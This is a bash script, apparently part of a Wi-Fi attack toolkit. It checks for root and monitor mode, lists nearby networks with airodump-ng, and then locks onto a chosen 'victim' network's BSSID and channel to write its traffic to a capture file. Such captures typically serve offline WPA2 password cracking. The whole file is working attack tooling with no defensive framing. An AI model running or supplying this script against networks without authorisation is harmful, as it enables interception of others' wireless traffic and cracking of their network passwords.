#!/bin/bash

set -e

source 00.sh

if [ $(id -u) -ne 0 ]; then
    error "This script must be run as root"
fi

[ -z $1 ] && error "The device interface name is mandatory."

if [ -z "$(iwconfig $1 | grep Monitor)" ]; then
	error "monitor mode disabled on $1"
fi

[ -z $2 ] && error "Sniffing mode is mandatory. (watch|capture)"

if [ $2 == "watch" ]; then
	airodump-ng $1
	exit 0
fi

[ -z $3 ] && error "The target network information must be provided.
		    You need to copy the selected target line from airodump-ng output.
 example: XX:XX:XX:XX:XX:XX  -62        2        0    0   6  54e  WPA2 CCMP   PSK  h3ll0"

victim=$3

status "$victim"

interface=$1
bssid="$(echo $victim | awk '{print $1}')"
channel="$(echo $victim | awk '{print $6}')"
out="c4ptur3.cap"

status "$bssid $channel $interface"

airodump-ng --channel $channel --bssid $bssid --write $out $interface
